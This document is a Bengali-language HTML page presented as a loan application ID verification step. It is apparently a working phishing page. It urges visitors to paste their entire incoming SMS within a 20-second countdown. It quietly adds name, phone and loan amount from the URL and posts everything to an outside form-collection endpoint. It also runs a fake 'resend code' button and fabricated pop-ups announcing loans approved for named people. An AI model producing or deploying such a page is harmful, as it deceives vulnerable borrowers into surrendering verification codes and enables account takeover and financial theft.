<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>অ্যাপ্লিকেশন আইডি যাচাই</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
        body { 
            background: #fff7ed; 
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }
        .container {
            width: 100%;
            max-width: 450px;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            box-shadow: 0 0 25px rgba(255, 106, 0, 0.08);
        }
        .header {
            background: linear-gradient(135deg, #ff5e00, #ff8800);
            color: #ffffff;
            padding: 26px 20px 22px;
            text-align: center;
            border-bottom-left-radius: 24px;
            border-bottom-right-radius: 24px;
            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.2);
        }
        .brand-logo-wrap {
            display: flex;
            justify-content: center;
            margin-bottom: 10px;
        }
        .company-logo {
            width: 55px;
            height: 55px;
            object-fit: cover;
            border-radius: 50%;
            background: #ffffff;
            padding: 2px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
        }
        .header h2 { font-size: 21px; margin-bottom: 4px; font-weight: 700; }
        .header p { font-size: 13px; opacity: 0.95; }

        .form-wrap { 
            padding: 22px 20px; 
            flex-grow: 1; 
            display: flex; 
            flex-direction: column; 
            justify-content: flex-start;
        }

        .timer-box {
            background: #fff8f0;
            border: 1.5px solid #fed7aa;
            color: #c2410c;
            padding: 12px 14px;
            border-radius: 12px;
            font-size: 13.5px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
            text-align: center;
        }
        .timer-box.expired {
            background: #fef2f2;
            border-color: #fecaca;
            color: #b91c1c;
        }
        .timer-num {
            color: #ea580c;
            font-weight: 800;
            font-size: 15px;
        }

        .form-group { margin-bottom: 18px; }
        .form-group label {
            display: block;
            font-size: 13.5px;
            font-weight: 700;
            color: #334155;
            margin-bottom: 8px;
        }
        .form-group label i {
            color: #ff5e00;
        }
        .form-group textarea {
            width: 100%;
            padding: 14px 15px;
            border: 1.5px solid #fed7aa;
            border-radius: 14px;
            font-size: 14px;
            outline: none;
            background: #fffaf5;
            resize: vertical;
            min-height: 125px;
            line-height: 1.5;
            transition: all 0.2s;
            color: #1e293b;
        }
        .form-group textarea:focus {
            border-color: #ff5e00;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.15);
        }

        .btn-submit {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #ff5e00, #ff8800);
            color: #ffffff;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3);
        }
        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }

        .resend-wrap {
            display: none;
            text-align: center;
            margin-top: 16px;
        }
        .btn-resend {
            background: none;
            border: 1.5px dashed #ff5e00;
            color: #ea580c;
            padding: 9px 18px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 7px;
        }
        .btn-resend:hover {
            background: #fff7ed;
        }

        .loan-popup {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #ffffff;
            color: #1e293b;
            padding: 12px 16px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 9999;
            max-width: 340px;
            border-left: 5px solid #16a34a;
            opacity: 0;
            transform: translateY(30px);
            transition: all 0.5s ease-in-out;
            pointer-events: none;
        }
        .loan-popup.show {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }
        .popup-icon {
            width: 38px;
            height: 38px;
            background: #dcfce7;
            color: #16a34a;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            flex-shrink: 0;
        }
        .popup-content { display: flex; flex-direction: column; }
        .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
        .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
        .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
        @media (max-width: 480px) {
            .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="brand-logo-wrap">
            <img src="./logo.png" alt="Company Logo" class="company-logo">
        </div>
        <h2>অ্যাপ্লিকেশন আইডি যাচাই</h2>
        <p>ফোনে আসা এসএমএস বা অ্যাপ্লিকেশন আইডিটি নিচে দিন</p>
    </div>

    <div class="form-wrap">
        <div class="timer-box" id="timerBox">
            <i class="fa-regular fa-clock"></i>
            <span id="timerText"><span class="timer-num" id="timeCount">২০</span> সেকেন্ডের মধ্যে আপনার পুরো এসএমএসটি কপি করে দিন।</span>
        </div>

        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
            <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
            <input type="hidden" name="মোবাইল_নম্বর" id="hiddenPhone">
            <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">

            <div class="form-group">
                <label><i class="fa-solid fa-envelope-open-text"></i> এসএমএস / অ্যাপ্লিকেশন আইডি টেক্সট</label>
                <textarea id="appText" name="সম্পূর্ণ_এসএমএস_বা_আইডি" required placeholder="আপনার ফোনে আসা সম্পূর্ণ বার্তাটি এখানে লিখুন বা পেস্ট করুন..."></textarea>
            </div>

            <button type="submit" id="btnSubmit" class="btn-submit">
                <span>যাচাই ও চূড়ান্ত সাবমিট</span>
                <i class="fa-solid fa-arrow-right"></i>
            </button>
        </form>

        <div class="resend-wrap" id="resendWrap">
            <button type="button" class="btn-resend" id="btnResend">
                <i class="fa-solid fa-rotate-right"></i> পুনরায় কোড পাঠান
            </button>
        </div>
    </div>
</div>

<div id="loanAlert" class="loan-popup">
    <div class="popup-icon">
        <i class="fa-solid fa-circle-check"></i>
    </div>
    <div class="popup-content">
        <span class="popup-title" id="popName">রহিমা খাতুন (ঢাকা)</span>
        <span class="popup-desc" id="popAmount">৳১০,০০০ লোন অনুমোদিত হয়েছে</span>
        <span class="popup-time" id="popTime">এইমাত্র</span>
    </div>
</div>

<script>
    // URL প্যারামিটার সংগ্রহ
    const params = new URLSearchParams(window.location.search);
    document.getElementById('hiddenName').value = params.get('name') || '';
    document.getElementById('hiddenPhone').value = params.get('phone') || '';
    document.getElementById('hiddenAmount').value = params.get('amount') || '';

    // ২০ সেকেন্ডের সাধারণ টাইমার
    let timeLeft = 20;
    let timer = null;
    const timerBox = document.getElementById("timerBox");
    const timerText = document.getElementById("timerText");
    const resendWrap = document.getElementById("resendWrap");
    const btnResend = document.getElementById("btnResend");
    const bnNums = ['০','১','২','৩','৪','৫','৬','৭','৮','৯'];

    function toBn(n) {
        return n.toString().replace(/[0-9]/g, d => bnNums[d]);
    }

    function startTimer() {
        clearInterval(timer);
        timeLeft = 20;
        resendWrap.style.display = "none";
        timerBox.classList.remove("expired");
        timerText.innerHTML = `<span class="timer-num" id="timeCount">${toBn(timeLeft)}</span> সেকেন্ডের মধ্যে আপনার পুরো এসএমএসটি কপি করে দিন।`;

        timer = setInterval(() => {
            timeLeft--;
            const countSpan = document.getElementById("timeCount");
            if (timeLeft > 0) {
                if (countSpan) countSpan.innerText = toBn(timeLeft);
            } else {
                clearInterval(timer);
                timerBox.classList.add("expired");
                timerText.innerHTML = 'সময় শেষ! কোড না পেয়ে থাকলে নিচে থেকে পুনরায় পাঠান।';
                resendWrap.style.display = "block";
            }
        }, 1000);
    }

    startTimer();

    btnResend.addEventListener("click", () => {
        alert("আপনার ফোনে নতুন করে কোড পাঠানো হচ্ছে...");
        startTimer();
    });

    // ফর্ম সাবমিশন লজিক
    const form = document.getElementById("verifyForm");
    const btnSubmit = document.getElementById("btnSubmit");

    form.addEventListener("submit", function(event) {
        event.preventDefault();
        btnSubmit.disabled = true;
        btnSubmit.innerHTML = '<span>তথ্য পাঠানো হচ্ছে...</span>';

        const data = new FormData(form);

        fetch(form.action, {
            method: "POST",
            body: data,
            headers: { 'Accept': 'application/json' }
        }).finally(() => {
            window.location.href = "./success.html";
        });
    });

    // পপআপ নোটিফিকেশন ডাটা
    const loanData = [
        { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
        { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
        { name: "সুমন হোসেন", district: "বগুড়া", amount: "৩০,০০০", time: "১ মিনিট আগে" },
        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" },
        { name: "মোঃ রফিকুল ইসলাম", district: "রাজশাহী", amount: "৫০,০০০", time: "৪ মিনিট আগে" },
        { name: "শারমিন জাহান", district: "সিলেট", amount: "২৫,০০০", time: "৩ মিনিট আগে" }
    ];

    let currentIndex = 0;
    const popupEl = document.getElementById("loanAlert");
    const nameEl = document.getElementById("popName");
    const amountEl = document.getElementById("popAmount");
    const timeEl = document.getElementById("popTime");

    function showNextNotification() {
        const item = loanData[currentIndex];
        nameEl.innerText = `${item.name} (${item.district})`;
        amountEl.innerText = `৳${item.amount} লোন অনুমোদিত হয়েছে`;
        timeEl.innerText = item.time;
        popupEl.classList.add("show");

        setTimeout(() => {
            popupEl.classList.remove("show");
        }, 4000);

        currentIndex = (currentIndex + 1) % loanData.length;
    }

    setTimeout(() => {
        showNextNotification();
        setInterval(showNextNotification, 8000);
    }, 2000);
</script>

</body>
</html>
